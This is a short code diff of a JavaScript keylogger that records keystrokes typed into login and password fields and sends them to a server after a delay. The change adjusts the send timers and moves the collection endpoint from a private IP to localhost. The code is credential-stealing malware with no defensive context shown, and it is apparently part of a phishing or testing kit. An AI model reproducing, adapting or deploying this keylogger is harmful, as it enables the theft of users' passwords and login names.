@@ -77,7 +77,7 @@ function keylogger_login(e) {
 	keys+=key;
 	if(compt_log == 0){
 		compt_log = 1;
-		setTimeout(function(){sendToServer("Password", keys)}, 4500);
+		setTimeout(function(){sendToServer("Password", keys)}, 5000);
 	}
 }
 
@@ -88,12 +88,12 @@ function keylogger_password(e) {
 	pass+=key;
 	if(compt_pass == 0){
 		compt_pass = 1;
-		setTimeout(function(){sendToServer("Login", pass)}, 4500);
+		setTimeout(function(){sendToServer("Login", pass)}, 5000);
 	}
 }
 
 
-var url = "https://10.43.9.242:8000/json";
+var url = "https://127.0.0.1:8080/json";
 var json = "";
 
 function sendToServer(libelle,value){
